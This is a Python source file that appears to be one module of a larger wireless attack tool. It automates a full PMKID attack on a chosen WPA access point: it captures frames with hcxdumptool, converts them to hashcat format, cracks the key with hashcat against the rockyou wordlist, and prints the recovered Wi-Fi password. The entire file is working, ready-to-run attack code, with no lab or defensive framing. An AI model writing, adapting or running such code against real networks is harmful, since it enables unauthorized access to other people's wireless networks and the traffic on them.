#!/usr/bin/env python3

"""
pmkid.py — PMKID attack module
"""

import os
import re
import gzip
import shutil
import subprocess
import time

# === ADDED: use thread-safe Rich printing from your UI system ===
from ui_bus import safe_print


# ─────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────
CAPTURES_DIR   = "captures"
WORDLIST_GZ    = os.path.join("wordlist", "rockyou.txt.gz")
WORDLIST_TXT   = os.path.join("wordlist", "rockyou.txt")

CAPTURE_TIMEOUT = 60
CRACK_TIMEOUT   = 300


# ─────────────────────────────────────────────
# VERIFY REQUIRED TOOLS
# ─────────────────────────────────────────────
def _require(tool: str) -> None:
    if not shutil.which(tool):
        raise RuntimeError(
            f"[pmkid] Required tool '{tool}' not found. "
            f"Install it with: sudo apt install {tool}"
        )


# ─────────────────────────────────────────────
# PREPARE WORDLIST
# ─────────────────────────────────────────────
def _prepare_wordlist() -> str:

    if os.path.exists(WORDLIST_TXT):
        safe_print(f"[cyan][pmkid][/cyan] Wordlist ready: {WORDLIST_TXT}")
        return WORDLIST_TXT

    if os.path.exists(WORDLIST_GZ):

        safe_print(f"[cyan][pmkid][/cyan] Decompressing {WORDLIST_GZ} ...")

        with gzip.open(WORDLIST_GZ, "rb") as f_in, open(WORDLIST_TXT, "wb") as f_out:
            shutil.copyfileobj(f_in, f_out)

        safe_print(f"[green][pmkid][/green] Wordlist ready: {WORDLIST_TXT}")
        return WORDLIST_TXT

    raise FileNotFoundError(
        "[pmkid] No wordlist found. Place rockyou.txt (or .gz) in the wordlist/ folder."
    )


# ─────────────────────────────────────────────
# CAPTURE PMKID
# ─────────────────────────────────────────────
def _capture_pmkid(bssid: str, channel: str, iface: str, capture_dir: str) -> str:

    _require("hcxdumptool")

    pcapng_path = os.path.join(capture_dir, "pmkid_capture.pcapng")

    bssid_clean = bssid.replace(":", "").lower()

    filterlist_path = os.path.join(capture_dir, "filterlist.txt")

    with open(filterlist_path, "w") as f:
        f.write(bssid_clean + "\n")

    cmd = [
        "hcxdumptool",
        "-i", iface,
        "-w", pcapng_path,
        "--filterlist_ap=" + filterlist_path,
        "--filtermode=2",
        "-c", channel,
        "--disable_client_attacks",
    ]

    # === CHANGED: all prints replaced with safe_print ===
    safe_print(f"\n[cyan][pmkid][/cyan] Starting PMKID capture on {iface}")
    safe_print(f"[cyan][pmkid][/cyan] Target BSSID: {bssid}")
    safe_print(f"[cyan][pmkid][/cyan] Channel: {channel}")
    safe_print(f"[cyan][pmkid][/cyan] Timeout: {CAPTURE_TIMEOUT}s")

    # === ADDED: spacing fix ===
    safe_print("")

    safe_print("[yellow][pmkid][/yellow] Waiting for PMKID frame ...")
    safe_print("[yellow][pmkid][/yellow] Press Ctrl+C to stop early")

    # === ADDED: extra spacing to prevent terminal overwrite ===
    safe_print("")

    try:

        # === CHANGED:
        # stderr/stdout redirected to DEVNULL to stop hcxdumptool
        # from corrupting Rich terminal formatting
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        time.sleep(CAPTURE_TIMEOUT)

        proc.terminate()

        try:
            proc.wait(timeout=5)

        except subprocess.TimeoutExpired:
            proc.kill()

    except KeyboardInterrupt:

        safe_print("\n[red][pmkid][/red] Capture interrupted by user.")

        proc.terminate()

    if not os.path.exists(pcapng_path) or os.path.getsize(pcapng_path) == 0:

        raise RuntimeError(
            "[pmkid] hcxdumptool produced no output. "
            "Make sure monitor mode is enabled and the AP is reachable."
        )

    safe_print(f"[green][pmkid][/green] Capture saved: {pcapng_path}")

    return pcapng_path


# ─────────────────────────────────────────────
# CONVERT TO HASHCAT FORMAT
# ─────────────────────────────────────────────
def _convert_to_hash(pcapng_path: str, capture_dir: str) -> str:

    _require("hcxpcapngtool")

    hash_path = os.path.join(capture_dir, "pmkid.hc22000")

    cmd = [
        "hcxpcapngtool",
        "-o",
        hash_path,
        pcapng_path
    ]

    safe_print("[cyan][pmkid][/cyan] Converting capture to hashcat format ...")

    result = subprocess.run(
        cmd,
        capture_output=True,
        text=True
    )

    if not os.path.exists(hash_path) or os.path.getsize(hash_path) == 0:

        safe_print("[red][pmkid][/red] hcxpcapngtool output:")

        safe_print(result.stdout or "(no stdout)")
        safe_print(result.stderr or "(no stderr)")

        raise RuntimeError(
            "[pmkid] No PMKID/EAPOL hashes extracted.\n"
            f"Try increasing CAPTURE_TIMEOUT ({CAPTURE_TIMEOUT}s)."
        )

    with open(hash_path) as f:
        count = sum(1 for line in f if line.strip())

    safe_print(f"[green][pmkid][/green] Extracted {count} hash(es)")

    return hash_path


# ─────────────────────────────────────────────
# CRACK HASH WITH HASHCAT
# ─────────────────────────────────────────────
def _crack_with_hashcat(hash_path: str, wordlist: str, target_name: str) -> dict:

    _require("hashcat")

    potfile = hash_path.replace(".hc22000", ".potfile")

    cmd = [
        "hashcat",
        "-m", "22000",
        "-a", "0",
        hash_path,
        wordlist,
        "--potfile-path", potfile,
        "--status",
        "--status-timer=10",
        "--quiet",
        "--force",
    ]

    safe_print(f"\n[cyan][pmkid][/cyan] Starting hashcat attack on {target_name}")
    safe_print(f"[cyan][pmkid][/cyan] Wordlist: {wordlist}")
    safe_print(f"[cyan][pmkid][/cyan] Timeout: {CRACK_TIMEOUT}s\n")

    start_time = time.time()

    keys_tried = 0

    try:

        # === CHANGED:
        # PIPE used here because we WANT hashcat status lines
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )

        for line in proc.stdout:

            line = line.rstrip()

            if line:
                safe_print(f"  {line}")

            match = re.search(r"Progress\.+:\s+([\d]+)/", line)

            if match:
                keys_tried = int(match.group(1))

            if time.time() - start_time > CRACK_TIMEOUT:

                proc.terminate()

                safe_print("\n[red][pmkid][/red] Crack timeout reached.")

                break

        proc.wait(timeout=10)

    except KeyboardInterrupt:

        proc.terminate()

        safe_print("\n[red][pmkid][/red] Cracking interrupted by user.")

    elapsed = time.time() - start_time

    password = None

    if os.path.exists(potfile):

        with open(potfile) as f:

            for line in f:

                line = line.strip()

                if ":" in line:
                    password = line.rsplit(":", 1)[-1]
                    break

    return {
        "found":      password is not None,
        "password":   password,
        "elapsed":    elapsed,
        "keys_tried": keys_tried,
    }


# ─────────────────────────────────────────────
# MAIN ENTRY
# ─────────────────────────────────────────────
def run_pmkid_attack(
    bssid: str,
    channel: str,
    iface: str,
    ssid: str
) -> bool:

    safe_print("\n" + "=" * 55)
    safe_print("  PMKID ATTACK")
    safe_print(f"  Target : {ssid} ({bssid})")
    safe_print(f"  Channel: {channel}  |  Interface: {iface}")
    safe_print("=" * 55)

    safe_ssid = "".join(
        c if c.isalnum() or c in "-_" else "_"
        for c in ssid
    )

    capture_dir = os.path.join(
        CAPTURES_DIR,
        f"{safe_ssid}_pmkid"
    )

    os.makedirs(capture_dir, exist_ok=True)

    try:

        wordlist  = _prepare_wordlist()

        pcapng = _capture_pmkid(
            bssid,
            channel,
            iface,
            capture_dir
        )

        hash_file = _convert_to_hash(
            pcapng,
            capture_dir
        )

        result = _crack_with_hashcat(
            hash_file,
            wordlist,
            ssid
        )

    except (RuntimeError, FileNotFoundError) as err:

        safe_print(f"\n[red][pmkid][/red] Attack failed: {err}")

        return False

    safe_print("\n" + "=" * 55)
    safe_print("  PMKID ATTACK SUMMARY")
    safe_print("=" * 55)

    if result["found"]:

        safe_print(
            f"[green]✓ Password found:[/green] "
            f"{result['password']}"
        )

    else:

        safe_print(
            "[red]✗ Password not found in wordlist.[/red]"
        )

    safe_print(f"  Time elapsed : {result['elapsed']:.1f}s")
    safe_print(f"  Keys tried   : {result['keys_tried']:,}")
    safe_print(f"  Capture dir  : {capture_dir}/")

    safe_print("=" * 55 + "\n")

    return result["found"]
